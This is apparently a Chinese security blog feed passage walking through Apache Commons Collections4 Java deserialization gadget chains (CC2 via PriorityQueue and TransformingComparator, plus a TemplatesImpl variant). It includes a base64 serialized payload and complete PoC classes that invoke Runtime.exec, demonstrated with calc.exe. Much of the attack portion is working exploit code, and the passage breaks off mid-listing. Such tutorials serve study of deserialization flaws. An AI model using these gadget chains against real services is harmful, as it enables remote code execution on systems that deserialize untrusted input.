class="hljs-comment">//输出rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAAVzK/rq+AAAANAAbCgAGAA0JAA4ADwgAEAoAEQASBwATBwAUAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAClNvdXJjZUZpbGUBAApIZWxsby5qYXZhDAAHAAgHABUMABYAFwEAC0hlbGxvIFdvcmxkBwAYDAAZABoBAAVIZWxsbwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYAIQAFAAYAAAAAAAEAAQAHAAgAAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAAIABAAEAAwABQABAAsAAAACAAxwdAASSGVsbG9UZW1wbGF0ZXNJbXBscHcBAHhxAH4ADXg=</span><br><br></code></pre></td></tr></table></figure><p>修改成这样后即可成功执行</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CC4与漏洞修复</title>
    <link href="/decemberus.com/2022/11/16/CC4%E4%B8%8E%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D(3)/"/>
    <url>/decemberus.com/2022/11/16/CC4%E4%B8%8E%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D(3)/</url>
    
    <content type="html"><![CDATA[<h1 id="CC4与漏洞修复"><a href="#CC4与漏洞修复" class="headerlink" title="CC4与漏洞修复"></a>CC4与漏洞修复</h1><p>Apache Commons Collections有以下两个分⽀版本：</p><ul><li><p>commons-collections:commons-collections</p></li><li><p>org.apache.commons:commons-collections4</p></li></ul><p>前面讲的CC系列的利用链都是用的第一个CC版本，那么第二个4.0版本能否存在呢</p><h2 id="CC4的改动"><a href="#CC4的改动" class="headerlink" title="CC4的改动"></a>CC4的改动</h2><p>pom.xml中可以看到CC的版本号</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191232275.png" alt="image-20230218145946665"> </p><p>然后，因为⽼的Gadget中依赖的包名都是 <code>org.apache.commons.collections</code> ，⽽新的包名已经变了，是 <code>org.apache.commons.collections4</code> 。</p><p>我们⽤已经熟悉的<code>CommonsCollections6</code>利⽤链做个例⼦，我们直接把代码拷⻉⼀遍，然后将所有 <code>import org.apache.commons.collections.*</code> 改成 <code>import org.apache.commons.collections4.*</code> 。</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191236764.png" alt="image-20230218150226112"> </p><p>但是此时LazyMap.decorate这个方法没了</p><p>3中decorate的定义是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br> <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>(map, factory);<br>&#125;<br></code></pre></td></tr></table></figure><p>而在4中换了个名字叫lazyMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;V, K&gt; LazyMap&lt;K, V&gt; <span class="hljs-title function_">lazyMap</span><span class="hljs-params">(Map&lt;K, V&gt; map, Transformer&lt;? <span class="hljs-built_in">super</span> K, ? extends V&gt; factory)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>(map, factory);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>&lt;V, K&gt;和&lt;K, V&gt;分别代表什么意思？</p><p>在这个方法中，”&lt;V, K&gt;”指定了返回的LazyMap对象的键类型为K，值类型为V。而在LazyMap类的定义中，键和值的类型是反过来的，因此定义为”&lt;K, V&gt;”。具体来说，LazyMap类的定义为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyMap</span>&lt;K, V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>&lt;K, V&gt; &#123;<br>    <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在这个定义中，K指代键类型，V指代值类型。因此，在这个方法中，”&lt;V, K&gt;”指代返回的LazyMap对象的值类型为V，键类型为K。</p></blockquote><p>于是将报错的那一段代码更改一下名字，换成lazyMap方法</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Map outerMap = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span><span class="hljs-keyword">lazy</span><span class="hljs-constructor">Map(<span class="hljs-params">innerMap</span>, <span class="hljs-params">transformerChain</span>)</span>;<br></code></pre></td></tr></table></figure><p>运行，成功弹出计算器</p><h2 id="PriorityQueue利用链"><a href="#PriorityQueue利用链" class="headerlink" title="PriorityQueue利用链"></a>PriorityQueue利用链</h2><p>除了⽼的⼏个利⽤链，ysoserial还为commons-collections4准备了两条新的利⽤链，那就是CommonsCollections2和CommonsCollections4。</p><p>commons-collections这个包之所有能攒出那么多利⽤链来，除了因为其使⽤量⼤，技术上的原因是其中包含了⼀些可以执⾏任意⽅法的Transformer。所以，在commons-collections中找Gadget的过程，实际上可以简化为，找⼀条从<code>Serializable#readObject()</code> ⽅法到 <code>Transformer#transform()</code>⽅法的调⽤链。</p><p>有了这个认识，我们再来看CommonsCollections2，其中⽤到的两个关键类是：</p><ul><li><p>java.util.PriorityQueue</p></li><li><p>org.apache.commons.collections4.comparators.TransformingComparator</p></li></ul><p><code>java.util.PriorityQueue</code>有自己的<code>readObject()</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>    <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>    <span class="hljs-comment">// Read in size, and any hidden stuff</span><br>    s.defaultReadObject();<br><br>    <span class="hljs-comment">// Read in (and discard) array length</span><br>    s.readInt();<br><br>    queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[size];<br><br>    <span class="hljs-comment">// Read in all elements.</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++)<br>        queue[i] = s.readObject();<br><br>    <span class="hljs-comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span><br>    <span class="hljs-comment">// spec has never explained what that might be.</span><br>    heapify();<br>&#125;<br></code></pre></td></tr></table></figure><p><code>org.apache.commons.collections4.comparators.TransformingComparator</code> 中有调⽤ transform() ⽅法的函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(I obj1, I obj2)</span> &#123;<br>        <span class="hljs-type">O</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj1);<br>        <span class="hljs-type">O</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj2);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.decorated.compare(value1, value2);<br>    &#125;<br></code></pre></td></tr></table></figure><p>所以，CommonsCollections2实际就是⼀条从 <code>PriorityQueue</code> 到 <code>TransformingComparator</code> 的利⽤链。</p><p>那我们先从<code>PriorityQueue</code>分析到<code>TransformingComparator</code></p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191236320.png" alt="image-20230218203602466"> </p><p><code>PriorityQueue#readObject</code>调用了<code>heapify()</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191236785.png" alt="image-20230218203724775"> </p><p>调用siftDown()方法</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191236443.png" alt="image-20230218203905654"> </p><p>调用了<code>siftDownUsingComparator()</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191236181.png" alt="image-20230218204141295"> </p><p>调用<code>compare()</code>方法</p><p>而这里调用的compare方法恰好是<code>TransformingComparator</code>所调用的</p><p>利用链如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream.readObject()<br>   PriorityQueue.readObject()<br>      ...<br>         TransformingComparator.compare()<br>            InvokerTransformer.transform()<br>               Method.invoke()<br>                  Runtime.exec()<br></code></pre></td></tr></table></figure><h2 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">PriorityQueue</span><span class="hljs-params">(Comparator&lt;? <span class="hljs-built_in">super</span> E&gt; comparator)</span> &#123;<br>    <span class="hljs-built_in">this</span>(DEFAULT_INITIAL_CAPACITY, comparator);<br>&#125;<br></code></pre></td></tr></table></figure><p>先创建一个Transformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] fakeTransformer =<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>[]&#123;<span class="hljs-keyword">new</span>  <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>Transformer[] transformers =<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;C:/Windows/System32/calc.exe&quot;</span> &#125;),<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformer);<br></code></pre></td></tr></table></figure><p>再创建一个<code>TransformingComparator</code>,传入我们的<code>chainedTransformer</code>,这里不一定要用到多态，可以不使用指向父类的子类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br></code></pre></td></tr></table></figure><p>实例化 PriorityQueue 对象，第⼀个参数是初始化时的⼤⼩，⾄少需要2个元素才会触发排序和⽐较，所以是2，然后随便加两个数字进入；第二个参数是比较是用到的Comparator</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, transformingComparator);<br>priorityQueue.add(<span class="hljs-number">1</span>);<br>priorityQueue.add(<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p>最后，用反射加入真正的Transformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">setFieldValue(chainedTransformer,<span class="hljs-string">&quot;iTransformers&quot;</span>,transformers);<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String fieldName,Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj,value);<br>    &#125;<br></code></pre></td></tr></table></figure><p>完整的poc如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC2_POC</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] fakeTransformer =<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>[]&#123;<span class="hljs-keyword">new</span>  <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transformers =<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;C:/Windows/System32/calc.exe&quot;</span> &#125;),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformer);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, transformingComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        setFieldValue(chainedTransformer,<span class="hljs-string">&quot;iTransformers&quot;</span>,transformers);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(priorityQueue);<br>        oos.close();<br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String fieldName,Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj,value);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>执行后成功弹出计算器</p><h2 id="改进PriorityQueue利用链"><a href="#改进PriorityQueue利用链" class="headerlink" title="改进PriorityQueue利用链"></a>改进PriorityQueue利用链</h2><p>尝试使用TemplatesImpl来构造改进，不用创建Transformer数组</p><p>先创建TemplatesImpl对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;getBytescode()&#125;);<br>setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br></code></pre></td></tr></table></figure><p>创建<code>InvokerTransformer</code>对象，并用来实例化<code>Comparator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;toString&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-type">Comparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformer);<br></code></pre></td></tr></table></figure><p>还是像上⼀节⼀样实例化 PriorityQueue ，但是此时向队列⾥添加的元素就是我们前⾯创建的TemplatesImpl 对象了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, comparator);<br>queue.add(obj);<br>queue.add(obj);<br></code></pre></td></tr></table></figure><p>原因很简单，和上⼀篇⽂章相同，因为我们这⾥⽆法再使⽤Transformer数组，所以也就不能⽤ ConstantTransformer 来初始化变量，需要接受外部传⼊的变量。⽽在 Comparator#compare()时，队列⾥的元素将作为参数传⼊ transform() ⽅法，这就是传给 TemplatesImpl#newTransformer的参数。</p><p>最后⼀步，将 toString ⽅法改成恶意⽅法 newTransformer ：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">set<span class="hljs-constructor">FieldValue(<span class="hljs-params">transformer</span>, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>)</span>;<br></code></pre></td></tr></table></figure><p>完整的POC如下所示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections2TemplatesImpl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getBytescode() <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.get(evil.EvilTemplatesImpl.class.getName());<br>        <span class="hljs-keyword">return</span> clazz.toBytecode();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span 